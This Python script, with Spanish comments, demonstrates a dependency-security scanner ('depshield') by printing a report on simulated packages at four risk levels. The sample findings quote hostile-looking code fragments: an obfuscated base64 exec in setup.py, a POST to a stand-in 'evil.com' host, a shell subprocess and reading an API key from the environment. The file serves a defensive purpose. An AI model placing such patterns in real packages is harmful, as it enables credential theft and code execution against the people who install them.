"""Demo visual de las 4 clasificaciones de riesgo de depshield.

Ejecutar con:
    python demo_clasificaciones.py

Genera la misma tabla visual que 'depshield scan' pero con paquetes
simulados para mostrar las 4 clasificaciones posibles.
"""

import sys
sys.path.insert(0, ".")

from depshield.analyzers.js_analyzer import Finding
from depshield.scoring.scorer import PackageScore
from depshield.scoring.report import print_report

# ---------- Paquetes simulados con las 4 clasificaciones ----------

demo_scores = [
    # HIGH_RISK (score=75) — paquete claramente malicioso
    PackageScore(
        name="evilpack",
        version="0.0.1",
        score=75,
        classification="HIGH_RISK",
        findings=[
            Finding("CODE_EXECUTION", "HIGH", "setup.py", 3, "exec(base64.b64decode(...))"),
            Finding("OBFUSCATION", "HIGH", "setup.py", 3, "base64.b64decode(payload)"),
            Finding("NETWORK_CALLS", "HIGH", "main.py", 12, "requests.post('http://evil.com')"),
            Finding("TYPOSQUATTING", "HIGH", "evilpack", 0, "Similar a 'eventpack' (dist=1)"),
        ],
        is_direct=True,
    ),

    # MEDIUM_RISK (score=45) — paquete sospechoso
    PackageScore(
        name="py-utilz",
        version="1.2.0",
        score=45,
        classification="MEDIUM_RISK",
        findings=[
            Finding("CODE_EXECUTION", "HIGH", "utils.py", 8, "subprocess.Popen(cmd, shell=True)"),
            Finding("ENV_ACCESS", "MEDIUM", "config.py", 15, "os.environ['API_KEY']"),
            Finding("YOUNG_PACKAGE", "MEDIUM", "py-utilz", 0, "Published 5 days ago"),
            Finding("NO_REPOSITORY", "MEDIUM", "py-utilz", 0, "No public repository"),
        ],
        is_direct=True,
    ),

    # LOW_RISK (score=16) — paquete con señales menores
    PackageScore(
        name="string-helpers",
        version="2.1.0",
        score=16,
        classification="LOW_RISK",
        findings=[
            Finding("ENV_ACCESS", "MEDIUM", "index.js", 4, "process.env.NODE_ENV"),
            Finding("SINGLE_MAINTAINER", "LOW", "string-helpers", 0, "Only 1 maintainer"),
            Finding("NO_LICENSE", "LOW", "string-helpers", 0, "No license declared"),
        ],
        is_direct=True,
    ),

    # SAFE (score=3) — paquete legítimo
    PackageScore(
        name="lodash",
        version="4.17.21",
        score=3,
        classification="SAFE",
        findings=[
            Finding("SINGLE_MAINTAINER", "LOW", "lodash", 0, "Only 1 maintainer: jdalton"),
        ],
        is_direct=True,
    ),

    # SAFE (score=0) — paquete completamente limpio
    PackageScore(
        name="is-odd",
        version="3.0.1",
        score=0,
        classification="SAFE",
        findings=[],
        is_direct=False,
    ),
]

# ---------- Mostrar la tabla ----------

print_report(demo_scores)
